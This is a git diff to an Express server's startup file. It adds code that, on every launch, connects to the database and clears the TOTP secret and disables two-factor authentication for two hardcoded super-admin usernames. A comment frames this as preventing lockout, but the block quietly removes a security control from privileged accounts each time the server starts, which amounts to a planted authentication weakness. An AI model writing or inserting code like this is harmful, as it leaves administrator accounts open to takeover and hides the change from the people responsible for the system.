@@ -5,6 +5,7 @@ import rateLimit from "express-rate-limit";
 import { registerRoutes } from "./routes";
 import { serveStatic } from "./static";
 import { createServer } from "http";
+import { Pool } from "pg";
 
 const app = express();
 app.set("trust proxy", 1);
@@ -82,6 +83,15 @@ app.use((req, res, next) => {
 });
 
 (async () => {
+  // Ensure protected super-admin accounts are never TOTP-locked on startup
+  try {
+    const pool = new Pool({ connectionString: process.env.DATABASE_URL });
+    await pool.query(`UPDATE users SET totp_secret = NULL, totp_enabled = false WHERE username IN ('@DONG798', '@aoe166')`);
+    await pool.end();
+  } catch (e) {
+    console.error("Startup TOTP reset failed:", e);
+  }
+
   await registerRoutes(httpServer, app);
 
   app.use((err: any, _req: Request, res: Response, next: NextFunction) => {
